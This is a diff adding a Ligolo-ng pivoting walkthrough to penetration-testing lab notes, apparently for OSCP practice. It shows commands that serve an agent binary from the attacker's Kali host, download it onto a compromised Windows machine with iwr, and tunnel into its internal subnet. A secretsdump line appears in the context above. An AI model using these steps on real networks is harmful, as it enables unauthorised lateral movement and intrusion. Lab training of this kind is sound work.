@@ -2064,3 +2064,325 @@ impacket-secretsdump htb/svc-alfresco@forest
 ```
 
 ---
+### Ligolo-Ng
+
+## Lab Topology
+
+```text
+Kali
+192.168.45.227
+       |
+       | Ligolo-ng TCP/11601
+       |
+       v
+Windows Pivot
+├── External: 192.168.173.141/24
+└── Internal: 10.10.173.141/24
+       |
+       v
+Internal Network
+10.10.173.0/24
+```
+
+> Authorized OSCP/lab use only.
+
+---
+
+# 1. Install Ligolo-ng on Kali
+
+```bash
+sudo apt update
+sudo apt install ligolo-ng ligolo-ng-common-binaries
+```
+
+Verify:
+
+```bash
+which ligolo-proxy
+ligolo-proxy -version
+```
+
+Find the packaged Windows agents:
+
+```bash
+dpkg -L ligolo-ng-common-binaries | grep windows
+```
+
+Windows x64 agent:
+
+```text
+/usr/share/windows-resources/binaries/ligolo-ng_agent_amd64.exe
+```
+
+`amd64` = normal Intel/AMD 64-bit Windows.
+
+---
+
+# 2. Create the Ligolo TUN Interface
+
+On Kali:
+
+```bash
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+```
+
+Verify:
+
+```bash
+ip addr show ligolo
+```
+
+If the interface already exists:
+
+```bash
+sudo ip link set ligolo up
+```
+
+Do **not** create another interface.
+
+---
+
+# 3. Start the Ligolo Proxy
+
+On Kali:
+
+```bash
+ligolo-proxy -selfcert
+```
+
+The agent will connect to:
+
+```text
+KALI_IP:11601
+```
+
+For this lab:
+
+```text
+192.168.45.227:11601
+```
+
+Verify from another Kali terminal:
+
+```bash
+ss -lntp | grep 11601
+```
+
+Keep the proxy terminal running.
+
+---
+
+# 4. Transfer the Windows Agent
+
+On Kali:
+
+```bash
+cd /usr/share/windows-resources/binaries/
+python3 -m http.server 8000
+```
+
+The Windows agent is now available from the lab pivot at:
+
+```text
+http://192.168.45.227:8000/ligolo-ng_agent_amd64.exe
+```
+
+On the Windows pivot:
+
+```powershell
+iwr http://192.168.45.227:8000/ligolo-ng_agent_amd64.exe -OutFile C:\Windows\Temp\agent.exe
+```
+
+Verify:
+
+```powershell
+dir C:\Windows\Temp\agent.exe
+```
+
+---
+
+# 5. Identify the Windows Pivot Networks
+
+On Windows:
+
+```cmd
+ipconfig
+route print
+```
+
+For this machine, `route print` showed:
+
+```text
+192.168.173.141/24
+10.10.173.141/24
+```
+
+And:
+
+```text
+Network Destination    Netmask          Interface
+10.10.173.0            255.255.255.0    10.10.173.141
+```
+
+Therefore:
+
+```text
+Pivot external IP = 192.168.173.141
+Pivot internal IP = 10.10.173.141
+Internal subnet   = 10.10.173.0/24
+```
+
+The pivot machine is **dual-homed**:
+
+```text
+192.168.173.0/24
+        |
+        |
+192.168.173.141
+   WINDOWS PIVOT
+10.10.173.141
+        |
+        |
+10.10.173.0/24
+```
+
+---
+
+# 6. Connect the Windows Agent to Kali
+
+On Windows:
+
+```powershell
+C:\Windows\Temp\agent.exe -connect 192.168.45.227:11601 -ignore-cert
+```
+
+Or:
+
+```powershell
+cd C:\Windows\Temp
+.\agent.exe -connect 192.168.45.227:11601 -ignore-cert
+```
+
+Because the Kali proxy was started using:
+
+```bash
+ligolo-proxy -selfcert
+```
+
+the disposable lab setup uses:
+
+```text
+-ignore-cert
+```
+
+Keep `agent.exe` running.
+
+---
+
+# 7. Select the Agent in Ligolo
+
+Return to the Ligolo proxy console on Kali.
+
+Run:
+
+```text
+session
+```
+
+Select the Windows pivot session.
+
+Check its network interfaces:
+
+```text
+ifconfig
+```
+
+For this lab, expect to see addresses corresponding to:
+
+```text
+192.168.173.141
+10.10.173.141
+```
+
+---
+
+# 8. Add the Internal Route on Kali
+
+The internal subnet discovered from `route print` is:
+
+```text
+10.10.173.0/24
+```
+
+Therefore, on Kali:
+
+```bash
+sudo ip route add 10.10.173.0/24 dev ligolo
+```
+
+Verify:
+
+```bash
+ip route | grep ligolo
+```
+
+Expected:
+
+```text
+10.10.173.0/24 dev ligolo
+```
+
+You can also check:
+
+```bash
+ip route get 10.10.173.142
+```
+
+It should indicate that traffic uses:
+
+```text
+dev ligolo
+```
+
+---
+
+# 9. Start the Ligolo Tunnel
+
+Return to the Ligolo console.
+
+Make sure the Windows agent is selected:
+
+```text
+session
+```
+
+Then:
+
+```text
+start
+```
+
+The route is now:
+
+```text
+Kali
+192.168.45.227
+       |
+       | Linux route
+       | 10.10.173.0/24 -> ligolo
+       v
+Ligolo TUN
+       |
+       v
+ligolo-proxy
+       |
+       | TCP/11601
+       v
+agent.exe
+Windows Pivot
+10.10.173.141
+       |
+       v
+10.10.173.0/24
+```
